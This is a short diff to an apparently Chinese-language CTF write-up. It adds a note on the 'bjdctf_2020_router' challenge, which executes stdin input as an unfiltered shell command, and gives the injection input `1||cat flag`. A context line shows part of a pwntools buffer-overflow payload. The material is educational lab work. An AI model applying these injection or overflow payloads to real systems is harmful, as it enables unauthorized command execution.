@@ -285,3 +285,7 @@ p.send(b'a'*(0x13+4) + p32(func_addr) + p32(main_addr) + p32(cmd_str) + b'\n')
 
 p.interactive()
 ```
+
+### bjdctf_2020_router
+
+从stdin读取字符串当作命令执行，没有过滤。直接输入 `1||cat flag` 即可~
